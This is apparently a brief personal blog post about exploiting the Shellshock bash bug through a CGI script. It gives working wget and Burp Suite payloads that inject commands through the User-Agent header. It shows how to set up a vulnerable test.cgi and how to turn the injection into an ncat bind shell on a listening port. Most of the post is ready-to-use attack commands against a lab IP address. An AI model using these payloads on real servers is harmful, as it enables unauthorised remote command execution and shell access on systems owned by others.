---
layout: post
title: Remote Shellshock CGI exploitation 
---

This wget one liner exploits shellshock through cgi by injecting commands into the user agent.

{% highlight bash %}
wget --no-check-certificate -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/ps" https://192.168.71.197/cgi-bin/test.cgi
{% endhighlight %}

Where /bin/ps is the command you want to run on the server and /ip/cgi-bin/test.cgi is a cgi file located on the server.

To make any server vulnerable to this it looks like there just needs to be a valid bash syntax cgi file located in cgi-bin

This was tested by putting this:

{% highlight bash %}
#! /bin/bash
echo "Content-type: text/html"
echo ''
echo 'CGI Bash Syntax Example'
{% endhighlight %}

 into test.cgi located in /usr/lib/cgi-bin/  which is aliased to the apache server on a default installation. Then test.cgi was chmoded 755.



 Now to escalate this into a shell


 Pop this into burpsuite:

{% highlight bash %}
  GET /cgi-bin/test.cgi HTTP/1.1
  Host: 192.168.71.197
  User-Agent:  () { :;}; /bin/bash -c 'ncat -l 1237 -e /bin/bash'
{% endhighlight %}

  Now there is a shell connection listening on port 1237

  works with this wget
{% highlight bash %}
  wget --no-check-certificate -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /usr/bin/ncat -l 1234 -e /bin/bash" http://192.168.71.197/cgi-bin/test.cgi

{% endhighlight %}

[kapsy's writup on shellshock](http://knapsy.github.io/blog/2014/10/07/basic-shellshock-exploitation/)


